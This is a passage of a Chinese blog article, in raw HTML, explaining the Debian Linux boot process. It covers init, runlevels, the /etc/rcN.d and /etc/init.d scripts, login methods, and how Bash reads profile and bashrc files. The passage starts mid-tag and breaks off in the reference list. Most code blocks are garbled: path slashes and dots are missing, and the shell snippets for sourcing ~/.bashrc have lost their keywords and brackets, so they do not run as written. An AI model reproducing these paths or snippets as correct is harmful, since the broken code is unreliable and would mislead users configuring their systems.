baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; font-family: &#39;Droid Sans Mono&#39;; font-size: 0.875em; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: 1.75em; vertical-align: baseline; width: auto; background-color: rgb(255, 255, 255);">　　$&nbsp;ls&nbsp;boot\r\n　　\r\n　　configamd64\r\n　　configamd64\r\n　　grub\r\n　　initrdimgamd64\r\n　　initrdimgamd64\r\n　　Systemmapamd64\r\n　　Systemmapamd64\r\n　　vmlinuzamd64\r\n　　vmlinuzamd64\r\n　　</pre></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">第二步、启动初始化进程</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">内核文件加载以后，就开始运行第一个程序 /sbin/init，它的作用是初始化系统环境。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><br/></p><p><img src="http://image.beekka.com/blog/201308/bg2013081703.png" style="margin: 0px; padding: 0px; border: 0px rgb(51, 51, 51); font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; display: block; max-width: 100%;"/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><br/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">由于init是第一个运行的程序，它的进程编号（pid）就是1。其他所有进程都从它衍生，都是它的子进程。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">第三步、确定运行级别</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">许多程序需要开机启动。它们在Windows叫做&quot;服务&quot;（service），在Linux就叫做&quot;<a href="http://zh.wikipedia.org/wiki/%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">守护进程</a>&quot;（daemon）。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">init进程的一大任务，就是去运行这些开机启动的程序。但是，不同的场合需要启动不同的程序，比如用作服务器时，需要启动Apache，用作桌面就不需要。Linux允许为不同的场合，分配不同的开机启动程序，这就叫做&quot;<a href="http://zh.wikipedia.org/wiki/%E8%BF%90%E8%A1%8C%E7%BA%A7%E5%88%AB" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">运行级别</a>&quot;（runlevel）。也就是说，启动时根据&quot;运行级别&quot;，确定要运行哪些程序。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><br/></p><p><img src="http://image.beekka.com/blog/201308/bg2013081704.png" style="margin: 0px; padding: 0px; border: 0px rgb(51, 51, 51); font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; display: block; max-width: 100%;"/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><br/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">Linux预置七种运行级别（0-6）。一般来说，0是关机，1是单用户模式（也就是维护模式），6是重启。运行级别2-5，各个发行版不太一样，对于Debian来说，都是同样的多用户模式（也就是正常模式）。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">init进程首先读取文件 /etc/inittab，它是运行级别的设置文件。如果你打开它，可以看到第一行是这样的：</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; font-family: &#39;Droid Sans Mono&#39;; font-size: 0.875em; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: 1.75em; vertical-align: baseline; width: auto; background-color: rgb(255, 255, 255);">　　idinitdefault\r\n　　</pre></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">initdefault的值是2，表明系统启动时的运行级别为2。如果需要指定其他级别，可以手动修改这个值。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">那么，运行级别2有些什么程序呢，系统怎么知道每个级别应该加载哪些程序呢？......回答是每个运行级别在/etc目录下面，都有一个对应的子目录，指定要加载的程序。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; font-family: &#39;Droid Sans Mono&#39;; font-size: 0.875em; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: 1.75em; vertical-align: baseline; width: auto; background-color: rgb(255, 255, 255);">　　etcrc0d\r\n　　etcrc1d\r\n　　etcrc2d\r\n　　etcrc3d\r\n　　etcrc4d\r\n　　etcrc5d\r\n　　etcrc6d\r\n　　</pre></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">上面目录名中的&quot;rc&quot;，表示run command（运行程序），最后的d表示directory（目录）。下面让我们看看 /etc/rc2.d 目录中到底指定了哪些程序。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; font-family: &#39;Droid Sans Mono&#39;; font-size: 0.875em; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: 1.75em; vertical-align: baseline; width: auto; background-color: rgb(255, 255, 255);">　　$&nbsp;ls&nbsp;&nbsp;etcrc2d\r\n　　\r\n　　README\r\n　　S01motd\r\n　　S13rpcbind\r\n　　S14nfscommon\r\n　　S16binfmtsupport\r\n　　S16rsyslog\r\n　　S16sudo\r\n　　S17apache2\r\n　　S18acpid\r\n　　\r\n　　</pre></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">可以看到，除了第一个文件README以外，其他文件名都是&quot;字母S+两位数字+程序名&quot;的形式。字母S表示Start，也就是启动的意思（启动脚本的运行参数为start），如果这个位置是字母K，就代表Kill（关闭），即如果从其他运行级别切换过来，需要关闭的程序（启动脚本的运行参数为stop）。后面的两位数字表示处理顺序，数字越小越早处理，所以第一个启动的程序是motd，然后是rpcbing、nfs......数字相同时，则按照程序名的字母顺序启动，所以rsyslog会先于sudo启动。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">这个目录里的所有文件（除了README），就是启动时要加载的程序。如果想增加或删除某些程序，不建议手动修改 /etc/rcN.d 目录，最好是用一些专门命令进行管理（参考<a href="http://www.debianadmin.com/manage-linux-init-or-startup-scripts.html" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">这里</a>和<a href="http://www.debianadmin.com/remove-unwanted-startup-files-or-services-in-debian.html" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">这里</a>）。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">第四步、加载开机启动程序</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">前面提到，七种预设的&quot;运行级别&quot;各自有一个目录，存放需要开机启动的程序。不难想到，如果多个&quot;运行级别&quot;需要启动同一个程序，那么这个程序的启动脚本，就会在每一个目录里都有一个拷贝。这样会造成管理上的困扰：如果要修改启动脚本，岂不是每个目录都要改一遍？</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">Linux的解决办法，就是七个 /etc/rcN.d 目录里列出的程序，都设为链接文件，指向另外一个目录 /etc/init.d ，真正的启动脚本都统一放在这个目录中。init进程逐一加载开机启动程序，其实就是运行这个目录里的启动脚本。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><br/></p><p><img src="http://image.beekka.com/blog/201308/bg2013081705.png" style="margin: 0px; padding: 0px; border: 0px rgb(51, 51, 51); font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; display: block; max-width: 100%;"/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><br/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">下面就是链接文件真正的指向。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; font-family: &#39;Droid Sans Mono&#39;; font-size: 0.875em; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: 1.75em; vertical-align: baseline; width: auto; background-color: rgb(255, 255, 255);">　　$&nbsp;ls&nbsp;l&nbsp;etcrc2d\r\n　　\r\n　　README\r\n　　S01motd&nbsp;&nbsp;initdmotd\r\n　　S13rpcbind&nbsp;&nbsp;initdrpcbind\r\n　　S14nfscommon&nbsp;&nbsp;initdnfscommon\r\n　　S16binfmtsupport&nbsp;&nbsp;initdbinfmtsupport\r\n　　S16rsyslog&nbsp;&nbsp;initdrsyslog\r\n　　S16sudo&nbsp;&nbsp;initdsudo\r\n　　S17apache2&nbsp;&nbsp;initdapache2\r\n　　S18acpid&nbsp;&nbsp;initdacpid\r\n　　\r\n　　</pre></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">这样做的另一个好处，就是如果你要手动关闭或重启某个进程，直接到目录 /etc/init.d 中寻找启动脚本即可。比如，我要重启Apache服务器，就运行下面的命令：</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; font-family: &#39;Droid Sans Mono&#39;; font-size: 0.875em; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: 1.75em; vertical-align: baseline; width: auto; background-color: rgb(255, 255, 255);">　　$&nbsp;sudo&nbsp;etcinitdapache2&nbsp;restart\r\n　　</pre></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">/etc/init.d 这个目录名最后一个字母d，是directory的意思，表示这是一个目录，用来与程序 /etc/init 区分。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">第五步、用户登录</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">开机启动程序加载完毕以后，就要让用户登录了。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><br/></p><p><img src="http://image.beekka.com/blog/201308/bg2013081706.png" style="margin: 0px; padding: 0px; border: 0px rgb(51, 51, 51); font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; display: block; max-width: 100%;"/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><br/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">一般来说，用户的登录方式有三种：</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline;">　　（1）命令行登录</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline;">　　（2）ssh登录</p><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　（3）图形界面登录</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">这三种情况，都有自己的方式对用户进行认证。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">（1）命令行登录：init进程调用getty程序（意为get teletype），让用户输入用户名和密码。输入完成后，再调用login程序，核对密码（Debian还会再多运行一个身份核对程序/etc/pam.d/login）。如果密码正确，就从文件 /etc/passwd 读取该用户指定的shell，然后启动这个shell。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">（2）ssh登录：这时系统调用sshd程序（Debian还会再运行/etc/pam.d/ssh ），取代getty和login，然后启动shell。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">（3）图形界面登录：init进程调用显示管理器，Gnome图形界面对应的显示管理器为gdm（GNOME Display Manager），然后用户输入用户名和密码。如果密码正确，就读取/etc/gdm3/Xsession，启动用户的会话。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">第六步、进入 login shell</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">所谓shell，简单说就是命令行界面，让用户可以直接与操作系统对话。用户登录时打开的shell，就叫做login shell。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><br/></p><p><img src="http://image.beekka.com/blog/201308/bg2013081707.png" style="margin: 0px; padding: 0px; border: 0px rgb(51, 51, 51); font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; display: block; max-width: 100%;"/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><br/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">Debian默认的shell是<a href="http://zh.wikipedia.org/wiki/Bash" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">Bash</a>，它会读入一系列的配置文件。上一步的三种情况，在这一步的处理，也存在差异。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">（1）命令行登录：首先读入 /etc/profile，这是对所有用户都有效的配置；然后依次寻找下面三个文件，这是针对当前用户的配置。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; font-family: &#39;Droid Sans Mono&#39;; font-size: 0.875em; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: 1.75em; vertical-align: baseline; width: auto; background-color: rgb(255, 255, 255);">　　bash_profile\r\n　　bash_login\r\n　　profile\r\n　　</pre></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">需要注意的是，这三个文件只要有一个存在，就不再读入后面的文件了。比如，要是 ~/.bash_profile 存在，就不会再读入后面两个文件了。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">（2）ssh登录：与第一种情况完全相同。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">（3）图形界面登录：只加载 /etc/profile 和 ~/.profile。也就是说，~/.bash_profile 不管有没有，都不会运行。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">第七步，打开 non-login shell</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">老实说，上一步完成以后，Linux的启动过程就算结束了，用户已经可以看到命令行提示符或者图形界面了。但是，为了内容的完整，必须再介绍一下这一步。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">用户进入操作系统以后，常常会再手动开启一个shell。这个shell就叫做 non-login shell，意思是它不同于登录时出现的那个shell，不读取/etc/profile和.profile等配置文件。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><br/></p><p><img src="http://image.beekka.com/blog/201308/bg2013081708.png" style="margin: 0px; padding: 0px; border: 0px rgb(51, 51, 51); font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; display: block; max-width: 100%;"/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><br/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">non-login shell的重要性，不仅在于它是用户最常接触的那个shell，还在于它会读入用户自己的bash配置文件 ~/.bashrc。大多数时候，我们对于bash的定制，都是写在这个文件里面的。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">你也许会问，要是不进入 non-login shell，岂不是.bashrc就不会运行了，因此bash 也就不能完成定制了？事实上，Debian已经考虑到这个问题了，请打开文件 ~/.profile，可以看到下面的代码：</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; font-family: &#39;Droid Sans Mono&#39;; font-size: 0.875em; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: 1.75em; vertical-align: baseline; width: auto; background-color: rgb(255, 255, 255);">　　&nbsp;&nbsp;n&nbsp;&quot;$BASH_VERSION&quot;&nbsp;&nbsp;\r\n　　　　&nbsp;&nbsp;f&nbsp;&quot;$HOME/.bashrc&quot;&nbsp;&nbsp;\r\n　　　　　　&nbsp;&quot;$HOME/.bashrc&quot;\r\n　　　　\r\n　　\r\n　　</pre></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">上面代码先判断变量 $BASH_VERSION 是否有值，然后判断主目录下是否存在 .bashrc 文件，如果存在就运行该文件。第三行开头的那个点，是source命令的简写形式，表示运行某个文件，写成&quot;source ~/.bashrc&quot;也是可以的。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">因此，只要运行～/.profile文件，～/.bashrc文件就会连带运行。但是上一节的第一种情况提到过，如果存在～/.bash_profile文件，那么有可能不会运行～/.profile文件。解决这个问题很简单，把下面代码写入.bash_profile就行了。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; font-family: &#39;Droid Sans Mono&#39;; font-size: 0.875em; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: 1.75em; vertical-align: baseline; width: auto; background-color: rgb(255, 255, 255);">　　&nbsp;&nbsp;f&nbsp;profile&nbsp;&nbsp;\r\n　　　　&nbsp;profile\r\n　　\r\n　　</pre></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">这样一来，不管是哪种情况，.bashrc都会执行，用户的设置可以放心地都写入这个文件了。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">Bash的设置之所以如此繁琐，是由于历史原因造成的。早期的时候，计算机运行速度很慢，载入配置文件需要很长时间，Bash的作者只好把配置文件分成了几个部分，阶段性载入。系统的通用设置放在 /etc/profile，用户个人的、需要被所有子进程继承的设置放在.profile，不需要被继承的设置放在.bashrc。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">顺便提一下，除了Linux以外， Mac OS X 使用的shell也是Bash。但是，它只加载.bash_profile，然后在.bash_profile里面调用.bashrc。而且，不管是ssh登录，还是在图形界面里启动shell窗口，都是如此。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">参考链接</strong></p><blockquote style="margin-top: 0px; margin-right: 0px; margin-left: 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal; margin-bottom: 0px !important;"><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline;">[1] Debian Wiki,&nbsp;<a href="https://wiki.debian.org/EnvironmentVariables" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">Environment Variables</a></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline;">[2] Debian 